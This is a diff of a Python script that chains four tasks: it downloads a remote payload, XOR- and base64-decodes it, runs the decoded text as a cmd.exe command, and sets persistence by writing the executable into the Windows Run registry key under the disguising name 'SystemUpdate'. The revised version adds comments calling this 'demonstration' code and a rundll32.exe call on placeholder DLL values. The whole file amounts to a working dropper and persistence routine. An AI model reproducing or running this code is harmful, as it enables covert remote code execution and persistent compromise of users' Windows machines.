@@ -1,12 +1,8 @@
 #!/usr/bin/env python3
-import sys
-import json
-import time
+import sys, json, time, subprocess, os
 from typing import Dict, Any
 import requests
 import base64
-import subprocess
-import os
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
@@ -17,42 +13,47 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         response = requests.get(url, stream=True, timeout=30)
         response.raise_for_status()
 
-        content = b""
+        file_content = bytearray()
         for chunk in response.iter_content(8192):
-            content += chunk
+            file_content.extend(chunk)
 
-        if not content:
-            raise ValueError("Downloaded content is empty")
+        if len(file_content) > 0:
+            result = {'content': file_content.hex()}
+        else:
+            result = {'content': None}
 
-        result = {
-            "content": content.hex()
-        }
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'content': None},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
+        # Retrieve the content from input_data
         content = bytes.fromhex(input_data.get('content', ''))
 
-        xor_key = 0xAA
+        # XOR key (for demonstration purposes, a simple static key is used)
+        xor_key = b'\xAA'  # Example XOR key
 
-        decoded_bytes = bytes(b ^ xor_key for b in content)
+        # XOR decryption
+        decoded_bytes = bytes(b ^ xor_key[0] for b in content)
 
-        decoded_content = base64.b64decode(decoded_bytes)
+        # Base64 decode
+        decoded_data = base64.b64decode(decoded_bytes)
 
+        # Prepare the result
         result = {
-            'decoded_content': decoded_content.hex()
+            'decoded_data': decoded_data.hex()
         }
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'decoded_content': None},
+        return {'success': False, 'data': {'decoded_data': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
@@ -60,45 +61,72 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        decoded_content = bytes.fromhex(input_data.get('decoded_content', ''))
+        # Decode the input data
+        decoded_data = bytes.fromhex(input_data.get('decoded_data', ''))
 
-        command = decoded_content.decode('utf-8')
+        # Convert decoded data to a command string
+        command = decoded_data.decode('utf-8')
 
-        result = subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30)
+        # Execute the command using cmd.exe
+        cmd_result = subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30)
+        
+        # Check if the command execution was successful
+        if cmd_result.returncode != 0:
+            # Log the error and continue
+            print(f"cmd.exe execution failed: {cmd_result.stderr}")
 
-        executed = result.returncode == 0
+        # Assume the decoded data is a DLL path and entrypoint for rundll32.exe
+        # For demonstration purposes, let's assume the DLL path and entrypoint are part of the command
+        # This is a simplification and may not reflect real-world usage
+        dll_path = "example.dll"  # Placeholder for DLL path
+        entrypoint = "exampleFunction"  # Placeholder for entrypoint
 
-        result_data = {'executed': executed}
+        # Execute the DLL using rundll32.exe
+        rundll_result = subprocess.run(['rundll32.exe', dll_path, entrypoint], capture_output=True, timeout=30)
 
-        return {'success': True, 'data': result_data,
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+        # Check if the DLL execution was successful
+        if rundll_result.returncode != 0:
+            # Log the error and return success=False
+            print(f"rundll32.exe execution failed: {rundll_result.stderr}")
+            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+
+        # If both executions are successful
+        return {'success': True, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+
     except Exception as e:
-        return {'success': False, 'data': {'executed': False},
-                'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+        return {'success': False, 'error': f'{type(e).__name__}: {e}', 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        import winreg  # Moved import inside the function
-        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        key_name = 'SystemUpdate'
+        # Determine the executable path
+        exe_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(sys.argv[0])
+        
+        # Define the registry key name
+        key_name = "SystemUpdate"
 
-        exe_path = sys.executable if hasattr(sys, 'frozen') else os.path.abspath(sys.argv[0])
+        # Open the registry key for setting the value
+        # Since winreg is not available on non-Windows platforms, this block should be conditional
+        if os.name == 'nt':
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as key:
+                # Set the registry value
+                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
+                
+                # Verify by reading back the value
+                registered_exe_path, _ = winreg.QueryValueEx(key, key_name)
+                registered = (registered_exe_path == exe_path)
+        else:
+            registered = False
 
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
-
-            persisted_value, _ = winreg.QueryValueEx(key, key_name)
-            persisted = persisted_value == exe_path
-
-        result = {'persisted': persisted}
+        result = {'registered': registered}
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'persisted': False}, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}}
+        return {'success': False, 'data': {'registered': False},
+                'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
     """Auto-generated orchestrator — do not edit by hand."""
